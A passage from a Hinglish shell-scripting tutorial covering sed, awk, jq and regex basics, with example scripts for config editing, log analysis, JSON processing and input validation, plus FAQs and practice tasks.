sed -n '5p' file.txt                # Print line 5
sed -n '/pattern/p' file.txt        # Print matching lines
```

### 7. **Example 1 (Basic)**

```bash
# Basic substitution
echo "hello world" | sed 's/world/universe/'
# Output: hello universe

# Global replacement
echo "foo foo foo" | sed 's/foo/bar/g'
# Output: bar bar bar

# In-place editing
sed -i 's/old_value/new_value/g' config.txt

# Delete lines
sed '/^#/d' file.txt                # Delete comments
sed '/^$/d' file.txt                # Delete empty lines
sed '1d' file.txt                   # Delete first line

# Print specific lines
sed -n '10,20p' file.txt            # Print lines 10-20
sed -n '/ERROR/p' app.log           # Print error lines

# Multiple operations
sed -e 's/foo/bar/g' -e 's/old/new/g' file.txt

# Case-insensitive
sed 's/error/ERROR/gi' file.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Configuration management with sed

set -euo pipefail

# Update configuration values
update_config() {
    local config_file=$1
    local key=$2
    local value=$3
    
    # Backup first
    cp "$config_file" "${config_file}.bak"
    
    # Update key=value format
    sed -i "s/^${key}=.*/${key}=${value}/" "$config_file"
    
    echo "✓ Updated $key to $value in $config_file"
}

# Clean log files
clean_logs() {
    local log_file=$1
    
    echo "Cleaning $log_file..."
    
    # Remove debug lines
    sed -i '/DEBUG/d' "$log_file"
    
    # Remove empty lines
    sed -i '/^$/d' "$log_file"
    
    # Remove timestamps (example: [2024-01-15 10:30:45])
    sed -i 's/\[[0-9-]* [0-9:]*\] //' "$log_file"
    
    echo "✓ Log cleaned"
}

# Mask sensitive data
mask_sensitive_data() {
    local file=$1
    
    # Mask passwords
    sed -i 's/password=[^ ]*/password=***MASKED***/g' "$file"
    
    # Mask API keys
    sed -i 's/api_key=[^ ]*/api_key=***MASKED***/g' "$file"
    
    # Mask credit cards (simple pattern)
    sed -i 's/[0-9]\{4\}-[0-9]\{4\}-[0-9]\{4\}-[0-9]\{4\}/****-****-****-****/g' "$file"
    
    # Mask emails
    sed -i 's/[a-zA-Z0-9._%+-]\+@[a-zA-Z0-9.-]\+\.[a-zA-Z]\{2,\}/***@***.com/g' "$file"
    
    echo "✓ Sensitive data masked"
}

# Bulk find and replace
bulk_replace() {
    local old_text=$1
    local new_text=$2
    local directory=$3
    
    echo "Replacing '$old_text' with '$new_text' in $directory..."
    
    find "$directory" -type f -name "*.txt" -o -name "*.conf" | while read file; do
        if grep -q "$old_text" "$file"; then
            sed -i "s/$old_text/$new_text/g" "$file"
            echo "✓ Updated: $file"
        fi
    done
}

# Add header to files
add_header() {
    local file=$1
    local header=$2
    
    # Insert at beginning
    sed -i "1i $header" "$file"
}

# Remove comments and empty lines
clean_config() {
    local config=$1
    
    # Remove comments (lines starting with #)
    sed -i '/^#/d' "$config"
    
    # Remove inline comments
    sed -i 's/#.*$//' "$config"
    
    # Remove empty lines
    sed -i '/^$/d' "$config"
    
    # Remove trailing whitespace
    sed -i 's/[[:space:]]*$//' "$config"
    
    echo "✓ Config cleaned: $config"
}

# Convert format
convert_format() {
    local input=$1
    local output=$2
    
    # Convert CSV to TSV
    sed 's/,/\t/g' "$input" > "$output"
    
    # Or convert Windows line endings to Unix
    sed -i 's/\r$//' "$input"
}

# Extract and transform
extract_urls() {
    local log=$1
    
    # Extract URLs and clean them
    sed -n 's/.*http\(s\?\):\/\/\([^ ]*\).*/http\1:\/\/\2/p' "$log" | \
        sed 's/?.*$//' | \
        sort | uniq
}

# Configuration migration
migrate_config() {
    local old_config=$1
    local new_config=$2
    
    cp "$old_config" "$new_config"
    
    # Update old format to new format
    sed -i 's/old_key_name/new_key_name/g' "$new_config"
    sed -i 's/deprecated_option/new_option/g' "$new_config"
    
    # Add new required fields
    sed -i '/\[section\]/a new_field=default_value' "$new_config"
    
    echo "✓ Configuration migrated"
}

# Main
main() {
    local action=${1:-help}
    
    case $action in
        update)
            update_config "$2" "$3" "$4"
            ;;
        clean)
            clean_logs "$2"
            ;;
        mask)
            mask_sensitive_data "$2"
            ;;
        *)
            echo "Usage: $0 {update|clean|mask} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`-i` without backup:** Data loss risk
- ❌ **Delimiter confusion:** `/` in pattern? Use different delimiter: `s|/path|/new|`
- ❌ **Forgetting `g`:** Sirf first match replace hota hai

### 10. **Best Practices / Pro Tips**
- 💡 **Backup first:** `-i.bak` use karo
- 💡 **Test without `-i`:** Pehle output dekho
- 💡 **Alternative delimiters:** `s|old|new|` or `s#old#new#`
- 💡 **Combine operations:** `-e` multiple times

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production deployment configuration updater

set -euo pipefail

readonly ENV=${1:-production}
readonly CONFIG_DIR="/etc/myapp"

deploy_config() {
    echo "=== Deploying $ENV Configuration ==="
    
    local config="$CONFIG_DIR/app.conf"
    
    # Backup
    cp "$config" "$config.backup.$(date +%Y%m%d_%H%M%S)"
    
    # Update environment
    sed -i "s/^environment=.*/environment=$ENV/" "$config"
    
    # Update database based on environment
    if [ "$ENV" = "production" ]; then
        sed -i 's/^db_host=.*/db_host=prod-db.example.com/' "$config"
        sed -i 's/^db_port=.*/db_port=5432/' "$config"
        sed -i 's/^debug=.*/debug=false/' "$config"
    else
        sed -i 's/^db_host=.*/db_host=staging-db.example.com/' "$config"
        sed -i 's/^debug=.*/debug=true/' "$config"
    fi
    
    # Remove development-only settings
    sed -i '/^dev_/d' "$config"
    
    # Clean up
    sed -i '/^#/d; /^$/d' "$config"
    
    echo "✓ Configuration deployed for $ENV"
    
    # Verify
    echo ""
    echo "Current configuration:"
    grep -E "^(environment|db_host|debug)=" "$config"
}

deploy_config
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `s/old/new/g` global replace
- ✅ `-i` in-place editing
- ✅ `/pattern/d` delete lines
- ✅ `-n` with `p` print specific
- ✅ Always backup first!

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: In-place editing safe hai?**
A: `-i.bak` use karo backup ke saath.

**Q2: Pattern mein `/` hai toh?**
A: Different delimiter use karo: `s|/path|/new|`

**Q3: Multiple replacements ek saath?**
A: `-e` use karo: `sed -e 's/a/b/' -e 's/c/d/'`

### 14. **Practice ke liye Task**

```bash
# 1. Basic replace
echo "hello world" | sed 's/world/universe/'

# 2. Global replace
sed 's/foo/bar/g' file.txt

# 3. In-place (with backup)
sed -i.bak 's/old/new/g' file.txt

# 4. Delete lines
sed '/^#/d' file.txt

# 5. Print specific
sed -n '10,20p' file.txt

# 6. Multiple operations
sed -e 's/a/A/g' -e 's/b/B/g' file.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- ✏️ sed for find & replace
- 🔄 `s/old/new/g` global replace
- 💾 `-i` modifies files directly
- 🗑️ `/pattern/d` deletes lines
- ⚠️ Always backup before `-i`!

> **💡 Ye Zaroor Yaad Rakhein:**
> sed bulk editing ka king! `s/old/new/g` for replace, `-i.bak` for safe in-place editing. `/pattern/d` to delete. Test pehle bina `-i` ke. Production mein backup zaroori!

---

## **Topic 7: `awk` (Columns `'{print $1}'`, Separator `-F`, Patterns `'/.../`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**awk** - Powerful pattern scanning and text processing language.

### 2. **Ye Kya Hai? (What is it?)**
`awk` ek programming language hai text processing ke liye. Columns extract karta hai (`$1`, `$2`), custom separators use karta hai (`-F`), patterns match karta hai, aur calculations perform karta hai. sed se zyada powerful.

**Analogy:** awk ek Swiss Army knife hai text processing ka - cut, grep, sed sab ek mein, plus programming capabilities.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Column processing** - Field-based operations
- ✅ **Calculations** - Math operations on data
- ✅ **Pattern matching** - Conditional processing
- ✅ **Report generation** - Formatted output

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- CSV/TSV processing
- Log analysis with calculations
- Report generation
- Complex text transformations

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Complex sed/cut combinations
- Limited data processing
- Manual calculations
- Inefficient scripts

### 6. **Syntax aur Common Options**

```bash
# Basic column printing
awk '{print $1}' file.txt           # First column
awk '{print $1, $3}' file.txt       # Columns 1 and 3
awk '{print $NF}' file.txt          # Last column

# Custom separator
awk -F ',' '{print $1}' file.csv    # CSV
awk -F ':' '{print $1}' /etc/passwd # Colon-separated

# Pattern matching
awk '/pattern/ {print}' file.txt    # Lines matching pattern
awk '$3 > 100' file.txt             # Column 3 > 100

# Calculations
awk '{sum += $1} END {print sum}'   # Sum of column 1
awk '{print $1 * $2}' file.txt      # Multiply columns
```

### 7. **Example 1 (Basic)**

```bash
# Print columns
echo "John 25 Engineer" | awk '{print $1}'
# Output: John

echo "John 25 Engineer" | awk '{print $1, $3}'
# Output: John Engineer

# Last column
echo "a b c d e" | awk '{print $NF}'
# Output: e

# CSV processing
echo "John,25,NYC" | awk -F ',' '{print $1, $3}'
# Output: John NYC

# /etc/passwd - usernames and shells
awk -F ':' '{print $1, $NF}' /etc/passwd

# Pattern matching
awk '/error/ {print $0}' app.log
# Prints lines containing "error"

# Conditional
awk '$3 > 50 {print $1, $3}' data.txt
# Print name and value if value > 50

# Calculations
echo -e "10\n20\n30" | awk '{sum += $1} END {print sum}'
# Output: 60

# Average
awk '{sum += $1; count++} END {print sum/count}' numbers.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced log analysis with awk

set -euo pipefail

readonly LOG_FILE="/var/log/nginx/access.log"

# Analyze access log
analyze_access_log() {
    echo "=== Access Log Analysis ==="
    
    # Top 10 IPs by request count
    echo "Top 10 IPs:"
    awk '{print $1}' "$LOG_FILE" | \
        sort | uniq -c | sort -rn | head -10
    
    echo ""
    
    # Request methods distribution
    echo "Request Methods:"
    awk '{print $6}' "$LOG_FILE" | \
        tr -d '"' | sort | uniq -c | sort -rn
    
    echo ""
    
    # Status code distribution
    echo "Status Codes:"
    awk '{print $9}' "$LOG_FILE" | \
        sort | uniq -c | sort -rn
    
    echo ""
    
    # Average response size
    echo "Average Response Size:"
    awk '{sum += $10; count++} END {print sum/count " bytes"}' "$LOG_FILE"
}

# Process CSV data
process_csv() {
    local csv_file=$1
    
    echo "=== CSV Processing ==="
    
    # Calculate totals and averages
    awk -F ',' '
    NR == 1 {
        print "Processing:", $0
        next
    }
    {
        sum += $2
        count++
        if ($2 > max) max = $2
        if (min == 0 || $2 < min) min = $2
    }
    END {
        print "Total:", sum
        print "Average:", sum/count
        print "Max:", max
        print "Min:", min
    }' "$csv_file"
}

# Generate report
generate_report() {
    local data_file=$1
    
    awk '
    BEGIN {
        print "╔════════════════════════════════════╗"
        print "║        Sales Report                ║"
        print "╠════════════════════════════════════╣"
        printf "║ %-15s %-10s %-8s ║\n", "Product", "Quantity", "Revenue"
        print "╠════════════════════════════════════╣"
    }
    {
        revenue = $2 * $3
        total += revenue
        printf "║ %-15s %-10d $%-7.2f ║\n", $1, $2, revenue
    }
    END {
        print "╠════════════════════════════════════╣"
        printf "║ %-26s $%-7.2f ║\n", "TOTAL", total
        print "╚════════════════════════════════════╝"
    }' "$data_file"
}

# Filter and transform
filter_data() {
    local input=$1
    
    # Filter rows where column 3 > 100 and calculate
    awk -F ',' '
    $3 > 100 {
        discount = $3 * 0.1
        final = $3 - discount
        printf "%s,%s,%.2f,%.2f\n", $1, $2, discount, final
    }' "$input"
}

# Complex pattern matching
analyze_errors() {
    local log=$1
    
    awk '
    /ERROR/ {
        errors++
        error_lines[errors] = $0
    }
    /WARN/ {
        warnings++
    }
    /FATAL/ {
        fatal++
        print "FATAL ERROR:", $0
    }
    END {
        print "\n=== Summary ==="
        print "Errors:", errors
        print "Warnings:", warnings
        print "Fatal:", fatal
        print "Total Issues:", errors + warnings + fatal
    }' "$log"
}

# Group and aggregate
group_by_user() {
    local log=$1
    
    # Group requests by user and count
    awk -F '|' '
    {
        user = $2
        users[user]++
        total_time[user] += $4
    }
    END {
        print "User Statistics:"
        for (user in users) {
            avg = total_time[user] / users[user]
            printf "%-15s: %5d requests, avg time: %.2fs\n", 
                   user, users[user], avg
        }
    }' "$log"
}

# Format output
format_table() {
    awk '
    BEGIN {
        FS = ","
        printf "%-20s %-10s %-15s\n", "Name", "Age", "Department"
        print "=================================================="
    }
    {
        printf "%-20s %-10s %-15s\n", $1, $2, $3
    }
    END {
        print "=================================================="
        print "Total Records:", NR
    }'
}

# Calculate statistics
calculate_stats() {
    local numbers=$1
    
    awk '
    {
        sum += $1
        sumsq += ($1)^2
        count++
        values[count] = $1
    }
    END {
        mean = sum / count
        variance = (sumsq / count) - (mean^2)
        stddev = sqrt(variance)
        
        print "Count:", count
        print "Sum:", sum
        print "Mean:", mean
        printf "Std Dev: %.2f\n", stddev
    }' "$numbers"
}

main() {
    if [ -f "$LOG_FILE" ]; then
        analyze_access_log
    else
        echo "Log file not found"
    fi
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`$0` vs `$1` confuse:** `$0` full line, `$1` first field
- ❌ **Separator specify nahi karna:** Default whitespace hai
- ❌ **Quotes bhoolna:** Single quotes use karo awk program ke liye

### 10. **Best Practices / Pro Tips**
- 💡 **`$NF` for last column:** Dynamic last field
- 💡 **`NR` for line number:** Built-in variable
- 💡 **BEGIN/END blocks:** Initialization aur summary
- 💡 **Arrays for aggregation:** Powerful grouping

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# System resource monitoring with awk

monitor_resources() {
    echo "=== System Resource Monitor ==="
    
    # CPU usage per process
    echo "Top 10 CPU Consumers:"
    ps aux | awk '
    NR > 1 {
        printf "%-15s %5.1f%% %s\n", $1, $3, $11
    }' | sort -k2 -rn | head -10
    
    echo ""
    
    # Memory usage summary
    echo "Memory Usage by User:"
    ps aux | awk '
    NR > 1 {
        mem[$1] += $4
        count[$1]++
    }
    END {
        for (user in mem) {
            printf "%-15s: %6.2f%% (%d processes)\n", 
                   user, mem[user], count[user]
        }
    }' | sort -k2 -rn
    
    echo ""
    
    # Disk usage analysis
    echo "Disk Usage Analysis:"
    df -h | awk '
    NR > 1 {
        usage = $5
        gsub(/%/, "", usage)
        if (usage > 80) {
            printf "⚠️  %s: %s (%.0f%%)\n", $1, $4, usage
        } else if (usage > 50) {
            printf "⚡ %s: %s (%.0f%%)\n", $1, $4, usage
        }
    }'
    
    echo ""
    
    # Network connections
    echo "Network Connections by State:"
    ss -tan | awk '
    NR > 1 {
        state[$1]++
    }
    END {
        for (s in state) {
            printf "%-15s: %d\n", s, state[s]
        }
    }'
}

monitor_resources
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `$1, $2, $3` for columns
- ✅ `$NF` for last column
- ✅ `-F` for custom separator
- ✅ `/pattern/` for filtering
- ✅ `BEGIN/END` for setup/summary

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `$0` kya hai?**
A: Puri line. `$1` first field, `$2` second, etc.

**Q2: Last column kaise print karu?**
A: `$NF` use karo (Number of Fields).

**Q3: awk vs sed kab use karu?**
A: sed simple replacements ke liye, awk complex processing ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. Print column
echo "a b c" | awk '{print $2}'

# 2. CSV
echo "John,25,NYC" | awk -F ',' '{print $1, $3}'

# 3. Last column
echo "a b c d" | awk '{print $NF}'

# 4. Sum
echo -e "10\n20\n30" | awk '{sum += $1} END {print sum}'

# 5. Filter
awk '$3 > 50' data.txt

# 6. /etc/passwd
awk -F ':' '{print $1, $7}' /etc/passwd | head -5
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔧 awk for column processing
- 📊 `$1, $2` for fields, `$NF` for last
- 🔍 `-F` for custom delimiter
- 📈 Built-in calculations
- 💪 Most powerful text tool

> **💡 Ye Zaroor Yaad Rakhein:**
> awk text processing ka powerhouse! Columns ke liye `$1, $2`, CSV ke liye `-F ','`, calculations built-in. BEGIN/END blocks powerful. Complex processing mein sed se better!

---

## **Topic 8: `jq` (JSON Processing)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**jq** - JSON data ko query aur manipulate karne ka tool.

### 2. **Ye Kya Hai? (What is it?)**
`jq` ek lightweight command-line JSON processor hai. JSON data ko parse, filter, transform, aur format karta hai. APIs aur modern applications ke liye essential tool.

**Analogy:** jq JSON ke liye wahi hai jo awk text ke liye - powerful querying aur transformation.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **API responses** - REST API data process
- ✅ **Configuration** - JSON configs parse
- ✅ **Data extraction** - Specific fields nikalna
- ✅ **Pretty printing** - Readable JSON format

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- API responses process karna
- JSON logs analyze karna
- Configuration files read/write
- Data transformation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual JSON parsing (error-prone)
- Complex grep/sed combinations
- Unreadable JSON
- API integration issues

### 6. **Syntax aur Common Options**

```bash
# Pretty print
jq '.' file.json

# Extract field
jq '.name' file.json
jq '.user.email' file.json

# Array access
jq '.[0]' array.json
jq '.items[0].name' file.json

# Filter
jq '.[] | select(.age > 25)' users.json

# Map
jq '.[] | .name' users.json

# Multiple fields
jq '{name: .name, age: .age}' file.json
```

### 7. **Example 1 (Basic)**

```bash
# Pretty print JSON
echo '{"name":"John","age":30}' | jq '.'
# Output:
# {
#   "name": "John",
#   "age": 30
# }

# Extract field
echo '{"name":"John","age":30}' | jq '.name'
# Output: "John"

# Nested field
echo '{"user":{"name":"John","email":"john@example.com"}}' | jq '.user.email'
# Output: "john@example.com"

# Array access
echo '[{"name":"John"},{"name":"Jane"}]' | jq '.[0].name'
# Output: "John"

# All array elements
echo '[{"name":"John"},{"name":"Jane"}]' | jq '.[].name'
# Output: "John"
#         "Jane"

# Filter
echo '[{"name":"John","age":30},{"name":"Jane","age":25}]' | \
    jq '.[] | select(.age > 25)'
# Output: {"name":"John","age":30}

# Raw output (no quotes)
echo '{"name":"John"}' | jq -r '.name'
# Output: John
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# API data processor using jq

set -euo pipefail

# Fetch and process API data
process_api_response() {
    local api_url=$1
    
    echo "=== Processing API Response ==="
    
    # Fetch data
    local response=$(curl -s "$api_url")
    
    # Extract specific fields
    echo "$response" | jq -r '.data[] | "\(.id): \(.name) - \(.email)"'
    
    # Count items
    local count=$(echo "$response" | jq '.data | length')
    echo "Total items: $count"
}

# Parse complex JSON
parse_config() {
    local config_file=$1
    
    # Extract database config
    local db_host=$(jq -r '.database.host' "$config_file")
    local db_port=$(jq -r '.database.port' "$config_file")
    local db_name=$(jq -r '.database.name' "$config_file")
    
    echo "Database Configuration:"
    echo "  Host: $db_host"
    echo "  Port: $db_port"
    echo "  Name: $db_name"
    
    # Extract array of servers
    echo ""
    echo "Servers:"
    jq -r '.servers[] | "  - \(.name): \(.ip):\(.port)"' "$config_file"
}

# Filter and transform
filter_users() {
    local users_json=$1
    
    # Users older than 25
    echo "=== Users older than 25 ==="
    jq '.users[] | select(.age > 25) | {name, age, email}' "$users_json"
    
    # Active users only
    echo ""
    echo "=== Active Users ==="
    jq '.users[] | select(.active == true) | .name' "$users_json"
}

# Aggregate data
aggregate_stats() {
    local data=$1
    
    # Calculate statistics
    jq '
    {
        total: .items | length,
        total_price: .items | map(.price) | add,
        average_price: (.items | map(.price) | add) / (.items | length),
        categories: .items | map(.category) | unique
    }' "$data"
}

# Transform JSON structure
transform_data() {
    local input=$1
    local output=$2
    
    # Transform from one format to another
    jq '
    .users | map({
        id: .user_id,
        fullName: "\(.first_name) \(.last_name)",
        contact: {
            email: .email,
            phone: .phone
        },
        metadata: {
            created: .created_at,
            active: .is_active
        }
    })' "$input" > "$output"
    
    echo "✓ Data transformed: $output"
}

# Merge JSON files
merge_json() {
    local file1=$1
    local file2=$2
    
    # Merge two JSON objects
    jq -s '.[0] * .[1]' "$file1" "$file2"
}

# Generate report from JSON logs
analyze_json_logs() {
    local log_file=$1
    
    echo "=== JSON Log Analysis ==="
    
    # Count by log level
    echo "Log Levels:"
    jq -r '.level' "$log_file" | sort | uniq -c | sort -rn
    
    echo ""
    
    # Errors only
    echo "Recent Errors:"
    jq 'select(.level == "error") | {timestamp, message, user}' "$log_file" | \
        head -20
    
    echo ""
    
    # Top users by activity
    echo "Top Active Users:"
    jq -r '.user' "$log_file" | sort | uniq -c | sort -rn | head -10
}

# API monitoring
monitor_api() {
    local api_url=$1
    
    while true; do
        local response=$(curl -s -w "\n%{http_code}" "$api_url")
        local body=$(echo "$response" | head -n -1)
        local status=$(echo "$response" | tail -n 1)
        
        if [ "$status" = "200" ]; then
            local health=$(echo "$body" | jq -r '.status')
            local uptime=$(echo "$body" | jq -r '.uptime')
            
            echo "[$(date)] Status: $health, Uptime: $uptime"
        else
            echo "[$(date)] API Error: HTTP $status"
        fi
        
        sleep 60
    done
}

# Extract and format
extract_report() {
    local data=$1
    
    # Create formatted report
    jq -r '
    "=== Sales Report ===",
    "Date: \(.report_date)",
    "",
    "Summary:",
    "  Total Sales: $\(.summary.total_sales)",
    "  Total Orders: \(.summary.total_orders)",
    "  Average Order: $\(.summary.average_order)",
    "",
    "Top Products:",
    (.top_products[] | "  \(.rank). \(.name): \(.sales) units")
    ' "$data"
}

main() {
    local action=${1:-help}
    
    case $action in
        parse)
            parse_config "$2"
            ;;
        filter)
            filter_users "$2"
            ;;
        analyze)
            analyze_json_logs "$2"
            ;;
        *)
            echo "Usage: $0 {parse|filter|analyze} <file>"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `.name` quotes mein hona chahiye
- ❌ **Array access galat:** `.[0]` not `.0`
- ❌ **Raw output nahi:** `-r` use karo quotes remove karne ke liye

### 10. **Best Practices / Pro Tips**
- 💡 **`-r` for raw:** Quotes remove karne ke liye
- 💡 **`-c` for compact:** Minified output
- 💡 **Pipe filters:** `| select()`, `| map()`
- 💡 **Test online:** jqplay.org for testing

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Kubernetes pod monitoring with jq

monitor_k8s_pods() {
    echo "=== Kubernetes Pod Status ==="
    
    # Get pod status
    kubectl get pods -o json | jq -r '
    .items[] | 
    select(.status.phase != "Running") |
    "\(.metadata.name): \(.status.phase) - \(.status.conditions[].message // "N/A")"
    '
    
    echo ""
    echo "=== Resource Usage ==="
    
    # Pod resource requests
    kubectl get pods -o json | jq '
    .items[] | {
        name: .metadata.name,
        cpu: .spec.containers[].resources.requests.cpu,
        memory: .spec.containers[].resources.requests.memory
    }'
    
    echo ""
    echo "=== Failed Pods ==="
    
    # Failed pods with details
    kubectl get pods -o json | jq -r '
    .items[] |
    select(.status.phase == "Failed") |
    {
        name: .metadata.name,
        reason: .status.reason,
        message: .status.message,
        restarts: .status.containerStatuses[].restartCount
    }'
}

monitor_k8s_pods
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `jq '.'` pretty print
- ✅ `.field` extract field
- ✅ `.[0]` array access
- ✅ `select()` filter
- ✅ `-r` raw output

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: jq install kaise karu?**
A: `sudo apt install jq` (Ubuntu) ya `brew install jq` (Mac)

**Q2: Nested fields kaise access karu?**
A: `.user.profile.email` dot notation use karo.

**Q3: Array ke sab elements kaise process karu?**
A: `.[]` use karo: `jq '.items[]'`

### 14. **Practice ke liye Task**

```bash
# 1. Pretty print
echo '{"name":"John"}' | jq '.'

# 2. Extract field
echo '{"name":"John","age":30}' | jq '.name'

# 3. Array
echo '[1,2,3]' | jq '.[1]'

# 4. Filter
echo '[{"age":30},{"age":25}]' | jq '.[] | select(.age > 25)'

# 5. Raw output
echo '{"name":"John"}' | jq -r '.name'

# 6. API call
curl -s https://api.github.com/users/github | jq '.name, .location'
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📦 jq for JSON processing
- 🔍 `.field` to extract
- 📋 `.[]` for arrays
- 🎯 `select()` to filter
- 🌐 Essential for APIs

> **💡 Ye Zaroor Yaad Rakhein:**
> jq modern scripting ka essential tool! API responses ke liye perfect. `-r` raw output ke liye. `select()` filtering ke liye. Practice karo - bahut powerful hai!

---

## **Topic 9: Regular Expressions (Regex) Basics (`^`, `$`, `+`, `\s`, `\.`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Regex** - Pattern matching ka powerful language.

### 2. **Ye Kya Hai? (What is it?)**
Regular expressions (regex) ek pattern matching language hai jo complex text patterns define karta hai. `^` line start, `$` line end, `+` one or more, `\s` whitespace, `\.` literal dot. grep, sed, awk sab mein use hota hai.

**Analogy:** Regex ek search template hai - jaise "find all emails" ya "match all phone numbers" - precise patterns define karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Pattern matching** - Complex patterns easily
- ✅ **Validation** - Email, phone, etc.
- ✅ **Extraction** - Specific data nikalna
- ✅ **Universal** - Har language mein use hota hai

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Data validation
- Log parsing
- Text extraction
- Search and replace

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Limited pattern matching
- Complex string operations
- Manual validation
- Inefficient parsing

### 6. **Syntax aur Common Options**

```bash
# Anchors
^pattern      # Start of line
pattern$      # End of line
^pattern$     # Exact match

# Character classes
.             # Any character
[abc]         # a, b, or c
[^abc]        # Not a, b, or c
[a-z]         # Lowercase letters
[0-9]         # Digits

# Quantifiers
*             # 0 or more
+             # 1 or more
?             # 0 or 1
{3}           # Exactly 3
{3,}          # 3 or more
{3,5}         # 3 to 5

# Special characters
\s            # Whitespace
\d            # Digit
\w            # Word character
\.            # Literal dot
\*            # Literal asterisk
```

### 7. **Example 1 (Basic)**

```bash
# Start of line
grep '^Error' app.log
# Matches: Error: something
# Not: Some Error

# End of line
grep 'failed$' app.log
# Matches: Operation failed
# Not: failed to start

# Exact match
grep '^ERROR$' app.log
# Only lines with exactly "ERROR"

# Any character
grep 'a.c' file.txt
# Matches: abc, aXc, a c

# Character class
grep '[0-9]' file.txt
# Lines with digits

# Quantifiers
grep 'a\+' file.txt        # One or more 'a'
grep 'a*' file.txt         # Zero or more 'a'
grep 'colou\?r' file.txt   # color or colour

# Email pattern (basic)
grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt

# IP address
grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt

# Phone number
grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}' file.txt
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Data validation and extraction using regex

set -euo pipefail

# Validate email
validate_email() {
    local email=$1
    local pattern='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if [[ $email =~ $pattern ]]; then
        echo "✓ Valid email: $email"
        return 0
    else
        echo "✗ Invalid email: $email"
        return 1
    fi
}

# Validate phone number
validate_phone() {
    local phone=$1
    
    # US format: (123) 456-7890 or 123-456-7890
    if [[ $phone =~ ^(\([0-9]{3}\)|[0-9]{3})[-\s]?[0-9]{3}[-\s]?[0-9]{4}$ ]]; then
        echo "✓ Valid phone: $phone"
        return 0
    else
        echo "✗ Invalid phone: $phone"
        return 1
    fi
}

# Extract URLs from text
extract_urls() {
    local file=$1
    
    echo "=== Extracting URLs ==="
    grep -oE 'https?://[a-zA-Z0-9./?=_-]+' "$file"
}

# Extract IP addresses
extract_ips() {
    local log=$1
    
    echo "=== Extracting IP Addresses ==="
    grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' "$log" | \
        sort | uniq
}

# Extract emails
extract_emails() {
    local file=$1
    
    echo "=== Extracting Emails ==="
    grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$file" | \
        sort | uniq
}

# Parse log timestamps
parse_timestamps() {
    local log=$1
    
    # Match: 2024-01-15 10:30:45
    grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' "$log"
}

# Validate credit card (basic)
validate_credit_card() {
    local card=$1
    
    # Basic format: 1234-5678-9012-3456
    if [[ $card =~ ^[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}$ ]]; then
        echo "✓ Valid format"
        return 0
    else
        echo "✗ Invalid format"
        return 1
    fi
}

# Extract hashtags
extract_hashtags() {
    local file=$1
    
    grep -oE '#[a-zA-Z0-9_]+' "$file" | sort | uniq -c | sort -rn
}

# Find lines with specific patterns
find_patterns() {
    local log=$1
    
    echo "=== Error Patterns ==="
    
    # Lines starting with ERROR
    echo "Errors at start:"
    grep -c '^ERROR' "$log" || echo "0"
    
    # Lines ending with failed
    echo "Failed operations:"
    grep -c 'failed$' "$log" || echo "0"
    
    # Lines with numbers
    echo "Lines with numbers:"
    grep -c '[0-9]' "$log" || echo "0"
}

# Clean and validate data
clean_data() {
    local input=$1
    local output=$2
    
    # Remove lines not matching pattern
    grep -E '^[a-zA-Z0-9,]+$' "$input" > "$output"
    
    echo "✓ Data cleaned: $output"
}

# Password strength check
check_password_strength() {
    local password=$1
    
    local has_upper=0
    local has_lower=0
    local has_digit=0
    local has_special=0
    local length=${#password}
    
    [[ $password =~ [A-Z] ]] && has_upper=1
    [[ $password =~ [a-z] ]] && has_lower=1
    [[ $password =~ [0-9] ]] && has_digit=1
    [[ $password =~ [^a-zA-Z0-9] ]] && has_special=1
    
    local score=$((has_upper + has_lower + has_digit + has_special))
    
